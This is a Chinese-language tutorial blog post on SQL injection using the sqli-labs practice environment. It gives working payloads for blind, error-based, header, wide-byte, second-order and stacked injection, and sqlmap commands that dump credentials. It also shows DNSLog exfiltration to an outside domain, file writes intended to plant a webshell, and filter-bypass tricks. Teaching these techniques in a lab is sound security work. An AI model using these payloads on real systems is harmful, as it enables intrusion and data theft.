class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 10--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204918453.png" alt="image-20201130204918453"></p><p>继续判断库名长度，此页面表示其小于10</p><p>缩小范围判断，得出当前库名长度为8</p><p><strong>3.判断当前数据库的第一个字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1)) &#x3D; 115--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130205353557.png" alt="image-20201130205353557"></p><p><strong>ASCII(s)</strong> 返回字符串 s 的第一个字符的 ASCII 码</p><p><strong>SUBSTR(s, n, len)</strong> 从字符串 s 的 n 位置截取长度为 len 的子字符串</p><p>页面显示正常，说明当前数据库的第一个字符的ascii码是115，对应s</p><p>…….更改位置，逐步得出库名security</p><p>……以此类推，得出其他数据</p><h2 id="利用burpsuite测试"><a href="#利用burpsuite测试" class="headerlink" title="利用burpsuite测试"></a><strong>利用burpsuite测试</strong></h2><p>对上面第三步进行抓包，使用intruder模块</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162311335.png" alt="image-20201209162311335"></p><p>设置payloads</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162508699.png" alt="image-20201209162508699"></p><p>start attack</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209163040562.png" alt="image-20201209163040562"></p><h1 id="GET-时间盲注"><a href="#GET-时间盲注" class="headerlink" title="GET 时间盲注"></a>GET 时间盲注</h1><p>当页面回显内容完全一致，考虑时间盲注</p><h2 id="手动测试-2"><a href="#手动测试-2" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.检测是否存在注入点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(10))--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129174459638.png" alt="image-20201129174459638"></p><p><strong>if（expression,a,b）</strong> expression条件为真返回a,条件为假返回b</p><p>F12查看network信息，可以看到延迟了10秒，证明存在注入点</p><p><strong>2.判断当前数据库的长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175046395.png" alt="image-20201129175046395"></p><p>延迟10秒，说明判断成功，当前数据库长度为8</p><p><strong>3.判断当前数据库的第一个字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175759624.png" alt="image-20201129175759624"></p><p>延迟10秒，说明当前数据库的第一个字符的ascii码是115，对应s</p><p>…….更改位置，逐步得出库名security</p><p>……以此类推，得出其他数据</p><h2 id="Sqlmap下测试"><a href="#Sqlmap下测试" class="headerlink" title="Sqlmap下测试"></a><strong>Sqlmap下测试</strong></h2><p>查询库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&quot; --technique B --dbs --batch   #布尔型盲注</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&quot; --technique T --dbs --batch   #时间盲注</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 1071&#x3D;1071 AND &#39;MFtC&#39;&#x3D;&#39;MFtC</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 5530 FROM (SELECT(SLEEP(5)))VtGF) AND &#39;VpPN&#39;&#x3D;&#39;VpPN</span><br></pre></td></tr></table></figure><p>后续步骤与上述Sqlmap测试方法一致</p><p>……</p><h1 id="POST-报错注入"><a href="#POST-报错注入" class="headerlink" title="POST 报错注入"></a>POST 报错注入</h1><h2 id="手动测试-3"><a href="#手动测试-3" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>通过SQL的or运算符，构造万能密码，判断是否为注入点</strong></p><p>判断注入点（添加单引号后报错）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203161208957.png" alt="image-20201203161208957"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or 1&#x3D;1--+&amp;passwd&#x3D;123456 构造万能密码</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230449498.png" alt="image-20201202230449498"></p><p>判断出注入点之后，就可以利用报错注入,布尔盲注，时间盲注等，获得我们想要的相关信息</p><p>如利用报错注入获取当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(database()),0x7e))--+&amp;passwd&#x3D;123456</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230243117.png" alt="image-20201202230243117"></p><p>……</p><h2 id="利用burp-suite测试"><a href="#利用burp-suite测试" class="headerlink" title="利用burp suite测试"></a><strong>利用burp suite测试</strong></h2><p><strong>使用Proxy功能抓包</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230900185.png" alt="image-20201202230900185"></p><p><strong>使用Repeater功能</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231127632.png" alt="image-20201202231127632"></p><p><strong>构造万能密码</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231557574.png" alt="image-20201202231557574"></p><h2 id="利用Sqlmap测试-1"><a href="#利用Sqlmap测试-1" class="headerlink" title="利用Sqlmap测试"></a>利用Sqlmap测试</h2><p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用<strong>Sqlmap -r 文件路径 -p 指定探测参数</strong></p><p>这里复制数据包至sqlmap目录下的target.txt文件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000201440.png" alt="image-20201203000201440"></p><p>在Sqlmap中指定探测技术使用–technique BEUSTQ</p><p><strong>–technique E</strong> 基于报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000800804.png" alt="image-20201203000800804"></p><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: passwd (POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&amp;passwd&#x3D;123456&#39; AND GTID_SUBSET(CONCAT(0x716a766b71,(SELECT (ELT(7356&#x3D;7356,1))),0x7176706a71),7356)-- lpbw&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>其后添加参数以获取其他信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --dbs</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --current-db --current-user --banner</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security --tables</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users --columns</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h1 id="POST-布尔、时间盲注"><a href="#POST-布尔、时间盲注" class="headerlink" title="POST 布尔、时间盲注"></a>POST 布尔、时间盲注</h1><p>在admin后添加单引号等字符后并无报错信息，考虑盲注</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203162418352.png" alt="image-20201203162418352"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (payload)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(payload)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br><span class="line">&#x2F;&#x2F;如 uname&#x3D;&#39;or (length(database())&#x3D;8)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(ascii(substr(database(),1,1))&#x3D;115)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210213730100.png" alt="image-20201210213730100"></p><p><strong>利用burpsuite抓取数据包</strong>，在存在注入点POST提交的参数后加入判断语句，根据Response的结果获取信息</p><p>如下图，判断当前数据库长度是否大于5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164042900.png" alt="image-20201203164042900"></p><p>再判断其长度是否大于10</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164228389.png" alt="image-20201203164228389"></p><p>最后判断其长度为8，以此类推，判断其他信息……</p><p>同样，也可以进行基于时间的盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (if(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1))--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p>在存在注入点POST提交的参数后添加判断语句，根据响应时间获取信息</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170636591.png" alt="image-20201203170636591"></p><p>继续判断</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170851871.png" alt="image-20201203170851871"></p><p>最后判断其长度为8，以此类推，判断其他信息……</p><p><strong>利用Sqlmap测试</strong></p><p>同样，这里复制数据包至target.txt,探测技术为–technique B/T</p><h1 id="DNSLog注入"><a href="#DNSLog注入" class="headerlink" title="DNSLog注入"></a>DNSLog注入</h1><p>利用场景：</p><p>不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致被封IP。所以，如果条件允许，我们可以结合DNSlog来快速的回显数据。MySQL数据库，通过DNSlog盲注需要用到 load_file() 函数，该函数不仅能加载本地文件，同时也能对URL发起请求。因为需要使用 load_file() 函数，所以需要root权限，并且 secure_file_priv 需要为空。</p><p>原理：</p><p>我们输入域名之后 ，需要向DNS服务器查询对应的IP地址，DNS服务器在解析的时候会留下记录，产生日志，我们可以通过查看日志来获取相应信息</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213182240957.png" alt="image-20201213182240957"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br><span class="line"></span><br><span class="line"># 查看当前数据库名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br></pre></td></tr></table></figure><p>相关网站：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">www.dnslog.cn</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213183240282.png" alt="image-20201213183240282"></p><p>相关网站：<a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213192730846.png" alt="image-20201213192730846"></p><h1 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h1><p>用户提交的参数会被代码中的某些措施进行过滤，但对于HTTP头中提交的内容很有可能就没有进行过滤，如HTTP头中User-Agent、Referer、Cookies等。</p><p><strong>1.HTTP User-Agent 注入</strong></p><p>判断注入点</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206223156670.png" alt="image-20201206223156670"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(payload),0x7e)) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206222552051.png" alt="image-20201206222552051"></p><p><strong>2.HTTP Referer 注入</strong></p><p>注入点在Referer位置</p><p><strong>3.Cookie注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207155137874.png" alt="image-20201207155137874"></p><p><strong>Sqlmap测试</strong></p><p>在注入点位置处添加*</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207160206033.png" alt="image-20201207160206033"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: Cookie #1* ((custom) HEADER)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND 6901&#x3D;6901-- FpnT</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND GTID_SUBSET(CONCAT(0x71627a7071,(SELECT (ELT(9508&#x3D;9508,1))),0x71766a7871),9508)-- kWcz</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND (SELECT 6663 FROM (SELECT(SLEEP(5)))sHMZ)-- iCIs</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: uname&#x3D;-8722&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7071,0x4f414141466c504c686648564856454869665a68614a4b564d6c4775556f6d6d79464e446f6f7078,0x71766a7871)-- -</span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>原理：</p><p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 <code>%df\’</code> =<code>%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 <code>%df%5c</code> 是一个宽字符，也就是<code>縗</code>，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213151446003.png" alt="image-20201213151446003"></p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-33&#x2F;index.php?id&#x3D;%df&#39; union select 1,group_concat(username,0x7e,password),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210204415465.png" alt="image-20201210204415465"></p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>原理：</p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p>示例：</p><p>在sqlilabs，Less-24中注册用户名为admin’#密码为123的账号</p><p>登录用户名 admi’# 并修改密码为123456，结果是用户名为admin的密码被修改了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br><span class="line">这是上面的数据库更新语句，在用户名为 &quot;admin&#39;#&quot; 时执行的实际是：</span><br><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>原理：</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><p>局限性：</p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表<br>名， 列名等信息</p><p>PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-38&#x2F;index.php ?id&#x3D;1%27;insert into users(id,username,password) values (&#39;39&#39;,&#39;less39&#39;,&#39;hello&#39;)--+</span><br></pre></td></tr></table></figure><h1 id="Mysql注入读写文件"><a href="#Mysql注入读写文件" class="headerlink" title="Mysql注入读写文件"></a>Mysql注入读写文件</h1><p>1.读文件（<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5729087.html">MySQL注入load_file常用路径</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,load_file(&#39;D:\\1.txt&#39;)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130215923264.png" alt="image-20201130215923264"></p><p>2.写文件（写webshell到网站目录）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;-1&#39;)) union select 1,&#39;&lt;?php phpinfo(); ?&gt;&#39;,3 into outfile &#39;E:\\web\\apache\\htdocs\\1.php&#39;--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130222727784.png" alt="image-20201130222727784"></p><p><strong>利用Sqlmap读写文件</strong></p><p>–file-read “路径”</p><p>–file-write “要写入的内容或所在文件路径” –file-dest “要写入的路径”</p><p>1.读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-read &quot;D:\\1.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130224238087.png" alt="image-20201130224238087"></p><p>2.写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-write &quot;E:\\1.txt&quot; --file-dest &quot;E:\\2.txt&quot;</span><br></pre></td></tr></table></figure><h1 id="SQL注入绕过手段"><a href="#SQL注入绕过手段" class="headerlink" title="SQL注入绕过手段"></a>SQL注入绕过手段</h1><p><strong>1.大小写绕过</strong></p><p>例如：如果过滤了order，可以使用OrdER来进行绕过</p><p><strong>2.双写绕过</strong></p><p>例如：如果过滤了union，发现union无论大小写都会被替换为空，可以使用UniunionOn</p><p><strong>3.编码绕过</strong></p><p>可以利用URL编码，绕过过滤机制</p><p>如，union%250cselect</p><p><strong>4.内联注释绕过</strong></p><p>内联注释里的内容会被当成SQL语句执行，例如/*!select */</p><p><strong>5.绕过去除注释符的SQL注入</strong></p><p>–+，– ，# ，等注释符被过滤失效，考虑其他方式，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;1&#39; or (extractvalue(1,concat(0x7e,(payload)))) or &#39;</span><br></pre></td></tr></table></figure><p><strong>6.绕过过滤and和or的SQL注入</strong></p><p>大小写变形，Or，oR，And，aND等</p><p>添加注释，a/**/nd</p><p>双写绕过，oorr</p><p>利用符号替代，and–&amp;&amp;,or–||</p><p><strong>7.绕过空格过滤</strong></p><p>可使用以下代替空格</p><p>%09 TAB 键（水平）</p><p>%0b TAB 键（垂直）</p><p>%0a 新建一行</p><p>%0c 新的一页</p><p>%0d return 功能</p><p>%a0 空格</p><p>/* xxx*/ 代替空格(利用fuzz得出xxx)</p><p>或语句间用括号，如 select(1)from(admin)where(length(passwd))=32</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/DarkHQ/article/details/79274376">mysql盲注（基于时间）</a></p><p>[2] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/csyxf/p/10241456.html">Mysql报错型注入总结</a></p><p>[3] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45146120/article/details/100186266?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control">MYSQL POST型注入详解</a></p><p>[4] <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3fe7904683ac">SQL注入防御绕过——二次注入</a></p><p>[5] <a target="_blank" rel="noopener" href="https://blog.csdn.net/helloc0de/article/details/76180190">SQL注入教程——（四）宽字节注入</a></p><p>[6] <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/90643951">SQL Injection8(堆叠注入)——强网杯2019随便注</a></p><p>[7] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44032232/article/details/109262724">【渗透测试】DNSLog注入</a></p></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>SQL注入基础</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://www.wawyw.top/posts/20316.html">https://www.wawyw.top/posts/20316.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a" style="display:inline-block;width:120px"><h>作者</h><div class="post-copyright-cc-info"><h>wawyw</h></div></div><div class="post-copyright-c" style="display:inline-block;width:120px"><h>发布于</h><div class="post-copyright-cc-info"><h>2021-02-19</h></div></div><div class="post-copyright-u" style="display:inline-block;width:120px"><h>更新于</h><div class="post-copyright-cc-info"><h>2021-03-08</h></div></div><div class="post-copyright-c" style="display:inline-block;width:120px"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">Web安全学习</a><a class="post-meta__tags" href="/tags/SQL/">SQL</a></div><div class="post_share"><div class="social-share" data-image="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sql.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/8774.html"><img class="prev-cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/rdbms.jpg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MySQL基础操作学习</div></div></a></div><div class="next-post pull-right"><a href="/posts/36028.html"><img class="next-cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/mysql.jpg" 